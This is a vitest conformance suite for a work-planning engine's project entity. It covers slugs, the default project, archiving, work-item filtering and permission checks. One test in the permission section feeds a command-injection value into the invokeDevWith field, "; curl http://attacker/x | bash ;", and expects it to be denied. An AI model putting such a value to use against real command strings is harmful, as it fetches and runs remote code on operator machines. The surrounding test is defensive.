/**
 * Conformance suite — Project entity (Phase 7 "Cockpit", Wave 2, D-E).
 *
 * A project is the unit of PARALLEL WORK for one operator: name + slug +
 * kind + optional repo binding, holding many features (BMAD epics). Written
 * BEFORE the engine change, per the suite-is-the-spec discipline.
 *
 * Backward compatibility is a pinned behavior, not an accident: a feature
 * created WITHOUT a project attaches to the lazily-created default project,
 * so every pre-Wave-2 flow (and data dir) keeps its exact meaning.
 */
import { describe, expect, it } from 'vitest';
import {
  createEngine,
  DEFAULT_PROJECT_SLUG,
  GuardFailedError,
  PermissionDeniedError,
  type Actor,
  type SpineEngine,
} from '../src/index.js';

function makeRig(): { engine: SpineEngine; planner: Actor } {
  const engine = createEngine();
  const planner = engine.createActor({ type: 'user', displayName: 'Planner' });
  engine.grant({ actorId: planner.id, permission: 'feature.init' });
  engine.grant({ actorId: planner.id, permission: 'task.plan' });
  return { engine, planner };
}

describe('project — creation, addressing, uniqueness', () => {
  it('createProject: slug derives from the name, getProject resolves by id AND slug, event appended', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({
      actorId: rig.planner.id,
      name: 'My App API',
      kind: 'code',
      repoPath: '/work/my-app-api',
      defaultSpecFolder: 'delivery/app',
    });
    expect(project.slug).toBe('my-app-api');
    expect(project.state).toBe('active');
    expect(project.kind).toBe('code');

    expect(rig.engine.getProject({ projectId: project.id }).id).toBe(project.id);
    expect(rig.engine.getProject({ projectId: 'my-app-api' }).id).toBe(project.id);

    const events = rig.engine.events(project.id);
    expect(events.some((e) => e.type === 'project.created' && e.streamType === 'project')).toBe(
      true,
    );
  });

  it('slug is unique: a second project with the same slug is refused', () => {
    const rig = makeRig();
    rig.engine.createProject({ actorId: rig.planner.id, name: 'Alpha' });
    expect(() => rig.engine.createProject({ actorId: rig.planner.id, name: 'Alpha' })).toThrow(
      GuardFailedError,
    );
  });

  it('kind defaults to mixed (code + non-code in one backlog is the normal case)', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Notes' });
    expect(project.kind).toBe('mixed');
  });
});

describe('project — features attach; the default project is the compatibility floor', () => {
  it('createFeature({projectId}) attaches; a bare createFeature lands in the lazily-created default project', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Proj A' });
    const attached = rig.engine.createFeature({ actorId: rig.planner.id, projectId: project.id });
    expect(attached.projectId).toBe(project.id);

    const bare = rig.engine.createFeature({ actorId: rig.planner.id });
    const fallback = rig.engine.getProject({ projectId: bare.projectId });
    expect(fallback.slug).toBe(DEFAULT_PROJECT_SLUG);

    // A second bare feature reuses the SAME default project.
    const bare2 = rig.engine.createFeature({ actorId: rig.planner.id });
    expect(bare2.projectId).toBe(bare.projectId);
  });

  it('a feature can carry a name (features stop being anonymous)', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Proj N' });
    const feature = rig.engine.createFeature({
      actorId: rig.planner.id,
      projectId: project.id,
      name: 'Sprint 1 epic',
    });
    expect(feature.name).toBe('Sprint 1 epic');
  });

  it('createFeature by slug also resolves (projects are addressed by handle everywhere)', () => {
    const rig = makeRig();
    rig.engine.createProject({ actorId: rig.planner.id, name: 'Sluggy' });
    const feature = rig.engine.createFeature({ actorId: rig.planner.id, projectId: 'sluggy' });
    const project = rig.engine.getProject({ projectId: feature.projectId });
    expect(project.slug).toBe('sluggy');
  });
});

describe('project — listing, update, archive', () => {
  it('listProjects shows active by default; includeArchived brings archived back', () => {
    const rig = makeRig();
    const a = rig.engine.createProject({ actorId: rig.planner.id, name: 'Keep' });
    const b = rig.engine.createProject({ actorId: rig.planner.id, name: 'Retire' });
    rig.engine.archiveProject({ actorId: rig.planner.id, projectId: b.id });

    expect(rig.engine.listProjects().map((p) => p.id)).toEqual([a.id]);
    expect(
      rig.engine
        .listProjects({ includeArchived: true })
        .map((p) => p.id)
        .sort(),
    ).toEqual([a.id, b.id].sort());
  });

  it('an archived project refuses new features (history stays readable)', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Done With' });
    const before = rig.engine.createFeature({ actorId: rig.planner.id, projectId: project.id });
    rig.engine.archiveProject({ actorId: rig.planner.id, projectId: project.id });

    expect(() =>
      rig.engine.createFeature({ actorId: rig.planner.id, projectId: project.id }),
    ).toThrow(GuardFailedError);
    // Reads still work.
    expect(rig.engine.getFeature(before.id).projectId).toBe(project.id);
  });

  it('updateProject edits binding fields and appends an audit event', () => {
    const rig = makeRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Rebind' });
    const updated = rig.engine.updateProject({
      actorId: rig.planner.id,
      projectId: project.id,
      repoPath: '/work/elsewhere',
      name: 'Rebound',
    });
    expect(updated.repoPath).toBe('/work/elsewhere');
    expect(updated.name).toBe('Rebound');
    expect(updated.slug).toBe('rebind'); // the handle never silently moves
    expect(
      rig.engine.events(project.id).some((e) => e.type === 'project.updated'),
    ).toBe(true);
  });
});

describe('project — work item queries filter by project', () => {
  it('listWorkItems({projectId}) spans every feature of that project and nothing else', () => {
    const rig = makeRig();
    const pa = rig.engine.createProject({ actorId: rig.planner.id, name: 'PA' });
    const pb = rig.engine.createProject({ actorId: rig.planner.id, name: 'PB' });
    const fa1 = rig.engine.createFeature({ actorId: rig.planner.id, projectId: pa.id });
    const fa2 = rig.engine.createFeature({ actorId: rig.planner.id, projectId: pa.id });
    const fb = rig.engine.createFeature({ actorId: rig.planner.id, projectId: pb.id });
    rig.engine.createWorkItem({
      featureId: fa1.id,
      actorId: rig.planner.id,
      externalKey: 'pa-1',
      title: 'pa one',
    });
    rig.engine.createWorkItem({
      featureId: fa2.id,
      actorId: rig.planner.id,
      externalKey: 'pa-2',
      title: 'pa two',
    });
    rig.engine.createWorkItem({
      featureId: fb.id,
      actorId: rig.planner.id,
      externalKey: 'pb-1',
      title: 'pb one',
    });

    const inA = rig.engine.listWorkItems({ projectId: pa.id });
    expect(inA.map((i) => i.externalKey).sort()).toEqual(['pa-1', 'pa-2']);
    const inB = rig.engine.listWorkItems({ projectId: 'pb' }); // slug resolves here too
    expect(inB.map((i) => i.externalKey)).toEqual(['pb-1']);
  });
});

// ---------------------------------------------------------------------------
// 0.2b — the planning surface is permissioned.
//
// This cluster OVERRIDES an earlier pin (CONFORMANCE.md: "`createProject` carries
// no engine-side permission check — deliberately symmetric with `createFeature`
// (whose `feature.init` convention is enforced at the ops layer, not pinned in the
// engine)"). The reason the pin falls is that its premise is false: nothing at any
// layer enforced it. `apps/spine-api/src/bus.ts` passes `ctx.actorId` straight into
// `createFeature` / `createWorkItem` / `importStories` / `project_create` with no
// `requirePermission` and no `requireAdmin`, so "the ops layer" was a convention
// nobody implemented.
//
// It matters more than an ordinary missing check because `createWorkItem` is the
// WRITE PATH for `invokeDevWith`, which the runner interpolates into the agent
// command it executes. An unpermissioned create is therefore an unpermissioned
// write into a string that runs on an operator machine — the inverse of D13, where
// the process that decides what runs must never be the unprivileged one.
//
// `task.plan` is the permission, not a new one: it already governs the adjacent
// `backlog→draft` transition, so "who may put work into the system" and "who may
// start moving it" stay the same authority. `feature.init` governs the feature and
// project containers, which is what the role bundles already assumed.
// ---------------------------------------------------------------------------
describe('the planning surface is permissioned (0.2b)', () => {
  function outsiderRig(): { engine: SpineEngine; planner: Actor; outsider: Actor } {
    const rig = makeRig();
    const outsider = rig.engine.createActor({ type: 'agent', displayName: 'Zero-grant agent' });
    return { ...rig, outsider };
  }

  it('denies createProject and createFeature without feature.init', () => {
    const rig = outsiderRig();
    expect(() => rig.engine.createProject({ actorId: rig.outsider.id, name: 'Squatted' })).toThrow(
      PermissionDeniedError,
    );
    expect(() => rig.engine.createFeature({ actorId: rig.outsider.id })).toThrow(PermissionDeniedError);
    // Nothing was created — a denied attempt mutates nothing (Phase 1 pin).
    expect(rig.engine.listProjects().some((p) => p.name === 'Squatted')).toBe(false);
  });

  it('denies createWorkItem without task.plan — the invokeDevWith write path', () => {
    const rig = outsiderRig();
    const feature = rig.engine.createFeature({ actorId: rig.planner.id });
    expect(() =>
      rig.engine.createWorkItem({
        featureId: feature.id,
        externalKey: 'injected-1',
        title: 'Looks ordinary',
        actorId: rig.outsider.id,
        // The payload that made this a code-execution path rather than a data one.
        invokeDevWith: '" ; curl http://attacker/x | bash ; "',
      }),
    ).toThrow(PermissionDeniedError);
    expect(rig.engine.listWorkItems({}).some((i) => i.externalKey === 'injected-1')).toBe(false);
  });

  it('denies importStories without task.plan — the same write path, in bulk', () => {
    const rig = outsiderRig();
    const feature = rig.engine.createFeature({ actorId: rig.planner.id });
    expect(() =>
      rig.engine.importStories({
        featureId: feature.id,
        yaml: '- id: "bulk-1"\n  title: Bulk\n  description: via import\n',
        actorId: rig.outsider.id,
      }),
    ).toThrow(PermissionDeniedError);
    expect(rig.engine.listWorkItems({}).some((i) => i.externalKey === 'bulk-1')).toBe(false);
  });

  it('a granted actor still does all four — the check adds authority, not friction', () => {
    const rig = outsiderRig();
    const project = rig.engine.createProject({ actorId: rig.planner.id, name: 'Permitted' });
    const feature = rig.engine.createFeature({ actorId: rig.planner.id, projectId: project.id });
    rig.engine.createWorkItem({
      featureId: feature.id,
      externalKey: 'ok-1',
      title: 'ok one',
      actorId: rig.planner.id,
    });
    const imported = rig.engine.importStories({
      featureId: feature.id,
      yaml: '- id: "ok-2"\n  title: ok two\n  description: fine\n',
      actorId: rig.planner.id,
    });
    expect(imported.imported).toEqual(['ok-2']);
    expect(rig.engine.listWorkItems({ projectId: project.id }).map((i) => i.externalKey).sort()).toEqual([
      'ok-1',
      'ok-2',
    ]);
  });
});
